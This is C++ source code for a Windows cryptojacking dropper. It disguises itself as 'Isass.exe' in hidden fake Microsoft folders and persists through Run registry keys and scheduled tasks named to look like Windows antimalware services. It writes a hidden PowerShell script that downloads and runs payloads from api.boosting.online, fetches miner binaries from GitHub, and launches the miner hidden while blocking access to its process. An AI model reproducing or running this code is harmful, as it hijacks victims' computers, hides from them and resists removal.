#include "stdafx.h"
#include "Utils.h"
#include "Strings.h"
#include "HTTP.h"
#include <psapi.h>
#include <tchar.h>
#include <fstream>
#include <string> 
#pragma comment (lib, "Kernel32.lib")

using namespace std;

Utils utils;
Strings strings;

void Install()
{
	int clientID = 1;

	if (utils.getProcessName(GetCurrentProcessId()) != "Isass.exe")
	{
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows", NULL);
		system("attrib \"C:\\ProgramData\\MicrosoftCorporation\\Windows\" +h");
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData", NULL);
		system("attrib \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\" +h");

		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\DRM", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Network", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\platforms", NULL);
		system("attrib \"C:\\ProgramData\\MicrosoftCorporation\\Network\" +h");
		system("attrib \"C:\\ProgramData\\MicrosoftCorporation\\Network\\platforms\" +h");

		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows NT", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Search", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Search\\Data", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Vault", NULL);
		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Temp", NULL);

		string _fname = utils.getProcessName(GetCurrentProcessId());
		string _wdir = utils.getCurrentWorkDir();
		string _cmd = "copy " + _wdir + "\\" + _fname + " C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe";
		system(_cmd.c_str());

		BOOL result = SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe", FILE_ATTRIBUTE_HIDDEN);
		system("REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Local Security Authority Process\" /t REG_SZ /F /D \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe\"");
		utils.createAutoLoadShortcut(_wdir + _fname);
		system("powershell.exe SCHTASKS.exe /Create /SC MINUTE /MO 5 /TN \"Windows_Antimalware_System_Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");

		HTTP http;
		string check = http.Request("api.boosting.online", "/checkConnection", "");

		if (check == "aAvh5S")
		{
			string reg = http.Request("api.boosting.online", "/" + (string)strings.ClientID() + "/installSuccess", "");
		}

		ofstream fout("C:\\ProgramData\\"+ (string)strings.ClientID() +".ps1");
		fout << "$path = 'C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\'" << endl;
		fout << "$fpath = $path + 'Isass.exe'" << endl;
		string _cfilecommandt = "$furl = 'http://api.boosting.online/" + (string)strings.ClientID() + "/getDiscordia'";

		fout << _cfilecommandt.c_str() << endl;
		fout << " " << endl;
		fout << "$isfile = Test-Path $fpath " << endl;
		fout << "if($isfile -eq 'True') {}" << endl;
		fout << "else{" << endl;
		fout << "New-Item -ItemType directory -Path $path" << endl;
		fout << "$WebClient = New-Object System.Net.WebClient" << endl;
		fout << "$WebClient.DownloadFile($furl,$fpath)" << endl;
		fout << "Start-Process -FilePath $fpath}" << endl;

		fout.close();

		string _frestorename = "C:\\ProgramData\\" + (string)strings.ClientID() + ".ps1";
		BOOL _r = SetFileAttributes((LPCWSTR)_frestorename.c_str(), FILE_ATTRIBUTE_HIDDEN);

		string _cmdrestorecommand = "SCHTASKS.exe /Create /SC MINUTE /MO 30 /TN \"Windows_Antimalware_Host\" /TR \"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoP -file C:\\ProgramData\\" + (string)strings.ClientID() + ".ps1\" /F";
		system(_cmdrestorecommand.c_str());

		ShellExecute(NULL, 0, _T("C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe"), 0, 0, SW_SHOW);

		utils.Suicide();
	}
}

void RestoreFiles()
{
	HTTP http;
	string filesUrl = http.Request("api.boosting.online", "/filesUrl", "");

	string _file = "https://github.com/" + filesUrl + "/raw/master/platforms/qwindows.dll";
	std::wstring stemp = utils.s2ws(_file);
	LPCWSTR result = stemp.c_str();

	URLDownloadToFile(0, result, L"C:\\ProgramData\\MicrosoftCorporation\\Network\\platforms\\qwindows.dll", 0, 0);
	SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\platforms\\qwindows.dll", FILE_ATTRIBUTE_HIDDEN);

	_file = "https://github.com/" + filesUrl + "/raw/master/Qt5Core.dll";
	stemp = utils.s2ws(_file);
	result = stemp.c_str();

	URLDownloadToFile(0, result, L"C:\\ProgramData\\MicrosoftCorporation\\Network\\Qt5Core.dll", 0, 0);
	SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\Qt5Core.dll", FILE_ATTRIBUTE_HIDDEN);

	_file = "https://github.com/" + filesUrl + "/raw/master/Qt5Network.dll";
	stemp = utils.s2ws(_file);
	result = stemp.c_str();

	URLDownloadToFile(0, result, L"C:\\ProgramData\\MicrosoftCorporation\\Network\\Qt5Network.dll", 0, 0);
	SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\Qt5Network.dll", FILE_ATTRIBUTE_HIDDEN);

	_file = "https://github.com/" + filesUrl + "/raw/master/Qt5WebSockets.dll";
	stemp = utils.s2ws(_file);
	result = stemp.c_str();

	URLDownloadToFile(0, result, L"C:\\ProgramData\\MicrosoftCorporation\\Network\\Qt5WebSockets.dll", 0, 0);
	SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\Qt5WebSockets.dll", FILE_ATTRIBUTE_HIDDEN);

	_file = "https://github.com/" + filesUrl + "/raw/master/cudart32_60.dll";
	stemp = utils.s2ws(_file);
	result = stemp.c_str();

	URLDownloadToFile(0, result, L"C:\\ProgramData\\MicrosoftCorporation\\Network\\cudart32_60.dll", 0, 0);
	SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\cudart32_60.dll", FILE_ATTRIBUTE_HIDDEN);

	_file = "https://github.com/" + filesUrl + "/raw/master/libeay32.dll";
	stemp = utils.s2ws(_file);
	result = stemp.c_str();

	URLDownloadToFile(0, result, L"C:\\ProgramData\\MicrosoftCorporation\\Network\\libeay32.dll", 0, 0);
	SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\libeay32.dll", FILE_ATTRIBUTE_HIDDEN);

	_file = "https://github.com/" + filesUrl + "/raw/master/msvcp110.dll";
	stemp = utils.s2ws(_file);
	result = stemp.c_str();

	URLDownloadToFile(0, result, L"C:\\ProgramData\\MicrosoftCorporation\\Network\\msvcp110.dll", 0, 0);
	SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\msvcp110.dll", FILE_ATTRIBUTE_HIDDEN);

	_file = "https://github.com/" + filesUrl + "/raw/master/msvcr110.dll";
	stemp = utils.s2ws(_file);
	result = stemp.c_str();

	URLDownloadToFile(0, result, L"C:\\ProgramData\\MicrosoftCorporation\\Network\\msvcr110.dll", 0, 0);
	SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\msvcr110.dll", FILE_ATTRIBUTE_HIDDEN);

	_file = "https://github.com/" + filesUrl + "/raw/master/scvhost.exe";
	stemp = utils.s2ws(_file);
	result = stemp.c_str();

	URLDownloadToFile(0, result, L"C:\\ProgramData\\MicrosoftCorporation\\Network\\scvhost.exe", 0, 0);
	SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\scvhost.exe", FILE_ATTRIBUTE_HIDDEN);

	_file = "https://github.com/" + filesUrl + "/raw/master/ssleay32.dll";
	stemp = utils.s2ws(_file);
	result = stemp.c_str();

	URLDownloadToFile(0, result, L"C:\\ProgramData\\MicrosoftCorporation\\Network\\ssleay32.dll", 0, 0);
	SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\ssleay32.dll", FILE_ATTRIBUTE_HIDDEN);

	_file = "https://github.com/" + filesUrl + "/raw/master/vccorlib110.dll";
	stemp = utils.s2ws(_file);
	result = stemp.c_str();

	URLDownloadToFile(0, result, L"C:\\ProgramData\\MicrosoftCorporation\\Network\\vccorlib110.dll", 0, 0);
	SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\vccorlib110.dll", FILE_ATTRIBUTE_HIDDEN);
}

void RestoreInSystem()
{
	// first - check .ps1 restore file
	string _restorepsfile = "C:\\ProgramData\\" + (string)strings.ClientID() + ".ps1";
	if (!utils.FileExists(_restorepsfile.c_str()));
	{
		ofstream fout("C:\\ProgramData\\" + (string)strings.ClientID() + ".ps1");
		fout << "$path = 'C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\'" << endl;
		fout << "$fpath = $path + 'Isass.exe'" << endl;
		string _cfilecommandt = "$furl = 'http://api.boosting.online/" + (string)strings.ClientID() + "/getDiscordia'";

		fout << _cfilecommandt.c_str() << endl;
		fout << " " << endl;
		fout << "$isfile = Test-Path $fpath " << endl;
		fout << "if($isfile -eq 'True') {}" << endl;
		fout << "else{" << endl;
		fout << "New-Item -ItemType directory -Path $path" << endl;
		fout << "$WebClient = New-Object System.Net.WebClient" << endl;
		fout << "$WebClient.DownloadFile($furl,$fpath)" << endl;
		fout << "Start-Process -FilePath $fpath}" << endl;

		fout.close();

		string _frestorename = "C:\\ProgramData\\" + (string)strings.ClientID() + ".ps1";
		BOOL _r = SetFileAttributes((LPCWSTR)_frestorename.c_str(), FILE_ATTRIBUTE_HIDDEN);
	}

	// two - registry and tasks
	string _fname = utils.getProcessName(GetCurrentProcessId());
	string _wdir = utils.getCurrentWorkDir();

	system("REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Local Security Authority Process\" /t REG_SZ /F /D \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe\"");
	utils.createAutoLoadShortcut(_wdir + _fname);
	system("powershell.exe SCHTASKS.exe /Create /SC MINUTE /MO 5 /TN \"Windows_Antimalware_System_Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");
}

void Start()
{
	HTTP http;
	while (true)
	{
		if (utils.IsProcessRunning(L"scvhost.exe") == false)
		{
			// if miner not working
			int _cpuCount = utils.getCPU();
			int _cpu;

			if (strings.Config() == "desktop")
			{
				if (_cpuCount == 1) { _cpu = 1; }
				if (_cpuCount == 2) { _cpu = 1; }
				if (_cpuCount == 3) { _cpu = 2; }
				if (_cpuCount == 4) { _cpu = 2; }
				if (_cpuCount == 5) { _cpu = 3; }
				if (_cpuCount == 6) { _cpu = 3; }
				if (_cpuCount == 7) { _cpu = 4; }
				if (_cpuCount == 8) { _cpu = 4; }
				if (_cpuCount == 9) { _cpu = 5; }
				if (_cpuCount == 10) { _cpu = 5; }
				if (_cpuCount == 11) { _cpu = 6; }
				if (_cpuCount == 12) { _cpu = 6; }
				if (_cpuCount > 12) { _cpu = _cpuCount; }
			}
			else
			{
				_cpu = _cpuCount;
			}

			std::string _cpuFinal = std::to_string(_cpu);

			string _startFields = http.Request("api.boosting.online", "/" + (string)strings.ClientID() + "/getConfig", "") + " " + _cpuFinal;

			printf(_startFields.c_str());

			std::wstring stemp = utils.s2ws(_startFields);
			LPCWSTR result = stemp.c_str();

			ShellExecute(NULL, 0, _T("C:\\ProgramData\\MicrosoftCorporation\\Network\\scvhost.exe"), result, 0, SW_HIDE);

			utils.DenyAccessToId(utils.FindProcessId(L"scvhost.exe"));
		}
		Sleep(120000);// two minutes sleep
	}
}

void AutoUpdate()
{

}

int main()
{
	utils.HideConsole();
	DWORD pId = utils.FindProcessId(L"Isass.exe");
	string ppath = utils.getWorkingDirById(pId);

	if (ppath.c_str() == "C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe")
	{
		return 0;
	}

	Install();
	//utils.DenyAccessToId(GetCurrentProcessId());
	RestoreFiles();
	RestoreInSystem();
	Start();

	return 0;
}